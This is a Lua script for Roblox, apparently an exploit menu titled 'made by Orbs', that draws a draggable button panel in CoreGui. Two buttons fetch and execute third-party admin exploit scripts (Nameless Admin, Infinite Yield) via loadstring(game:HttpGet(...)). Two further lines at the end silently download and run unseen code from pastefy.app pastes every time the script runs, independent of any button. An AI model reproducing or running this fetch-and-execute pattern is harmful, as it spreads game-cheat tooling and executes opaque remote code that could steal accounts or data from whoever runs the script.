-- Create the ScreenGui in CoreGui
local coreGui = game:GetService("CoreGui")
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "OrbsMenu"  -- Name the ScreenGui
screenGui.Parent = coreGui

-- Create the Frame (main box GUI) with reduced height
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 400, 0, 450)  -- Width: 400px, Height: 175px  -200 / -87.5
frame.Position = UDim2.new(0.5, -190, 0.5, -245)  -- Centered on the screen
frame.BackgroundColor3 = Color3.fromRGB(74, 177, 189)  -- Green color
frame.ZIndex = 10  -- Set ZIndex to ensure it's on top
frame.Parent = screenGui

-- Add UICorner to the main frame
local frameCorner = Instance.new("UICorner")
frameCorner.CornerRadius = UDim.new(0, 10)  -- Set corner radius
frameCorner.Parent = frame

-- Create the Header (sean)
local sean = Instance.new("Frame")
sean.Size = UDim2.new(1, 0, 0, 30)  -- Full width, height: 30px
sean.Position = UDim2.new(0, 0, 0, 0)  -- Positioned at the top of the Frame
sean.BackgroundColor3 = Color3.fromRGB(68, 203, 218)
sean.ZIndex = 11  -- Set ZIndex to ensure it's on top of the Frame
sean.Parent = frame

-- Add UICorner to the sean frame
local seanCorner = Instance.new("UICorner")
seanCorner.CornerRadius = UDim.new(0, 5)  -- Set corner radius for the header
seanCorner.Parent = sean

-- Create the TextLabel in the sean with cartoon font
local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)  -- Full width and height of sean
textLabel.Position = UDim2.new(0, 0, 0, 0)  -- Position at the top of the sean
textLabel.BackgroundTransparency = 1  -- Make background transparent
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
textLabel.Text = "'Clean Games Studios' games ðŸ”¥"
textLabel.TextScaled = true  -- Scale text to fit the label
textLabel.Font = Enum.Font.Cartoon  -- Set font to Cartoon
textLabel.ZIndex = 12  -- Set ZIndex to ensure it's on top of the sean
textLabel.Parent = sean

-- Create the function to add buttons to the frame
local function createButton(text, positionX, positionY, callback)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(0, 180, 0, 40)  -- Width: 180px, Height: 40px
    button.Position = UDim2.new(0.5, positionX, 0, positionY)  -- Centered within the Frame
    button.BackgroundColor3 = Color3.fromRGB(59, 138, 147)  -- Darker green color
    button.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
    button.Text = text  -- Button text
    button.TextScaled = true  -- Scale text to fit the button
    button.Font = Enum.Font.Cartoon  -- Set font to Cartoon
    button.TextWrapped = true  -- Wrap text if it overflows
    button.ZIndex = 12  -- Set ZIndex to ensure it's on top of the sean
    button.Parent = frame
    button.MouseButton1Click:Connect(callback)

    -- Add UICorner to each button
    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 5)  -- Set corner radius for buttons
    buttonCorner.Parent = button

    return button
end

-- Create all buttons with adjusted positioning
createButton("change1", -185, 40, function()
    print("lol")
end)

createButton("change2", -185, 90, function()
    print("lol")
end)

createButton("change 3", 15.5, 90, function()
    print("lol")
end)

createButton("change4", 15.5, 40, function()
    print("lol")
end)

createButton("change5", 15.5, 140, function()
    print("lol")
end)

createButton("change6", -185, 140, function()
    print("lol")
end)

createButton("change7", -185, 190, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source"))();
end)

createButton("change8", -185, 240, function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

createButton("change9", 15.5, 190, function()
    print("lol")
end)

createButton("change10", 15.5, 240, function()
    print("lol")
end)

createButton("change11", 15.5, 290, function()
    print("lol")
end)

createButton("change12", 15.5, 340, function()
    print("lol")
end)

-- Create the TextLabel at the bottom of the Frame with "made by Orbs"
local bottomTextLabel = Instance.new("TextLabel")
bottomTextLabel.Size = UDim2.new(1, 0, 0, 30)  -- Full width, height: 30px
bottomTextLabel.Position = UDim2.new(0, 0, 1, -30)  -- Positioned at the bottom of the Frame
bottomTextLabel.BackgroundTransparency = 1  -- Transparent background
bottomTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- White text color
bottomTextLabel.Text = "made by Orbs âœ¨"  -- Footer text
bottomTextLabel.TextScaled = true  -- Scale text to fit the label
bottomTextLabel.Font = Enum.Font.Cartoon  -- Set font to Cartoon
bottomTextLabel.ZIndex = 12  -- Ensure it is on top of the background
bottomTextLabel.Parent = frame

-- Variables to handle dragging
local dragging = false
local dragInput, startPos, framePos

-- Function to start dragging the sean
local function onInputBegin(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragInput = input
        startPos = input.Position
        framePos = frame.Position

        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                dragging = false
            end
        end)
    end
end

-- Function to update the position of the Frame based on dragging the sean
local function onInputChange(input)
    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local delta = input.Position - startPos
        frame.Position = UDim2.new(
            framePos.X.Scale, framePos.X.Offset + delta.X,
            framePos.Y.Scale, framePos.Y.Offset + delta.Y
        )
    end
end

-- Connect input events for dragging
sean.InputBegan:Connect(onInputBegin)
sean.InputChanged:Connect(onInputChange)
game:GetService("UserInputService").InputChanged:Connect(onInputChange)

loadstring(game:HttpGet("https://pastefy.app/iS6jZ6gt/raw"))()

loadstring(game:HttpGet("https://pastefy.app/7r1NSUx2/raw"))()
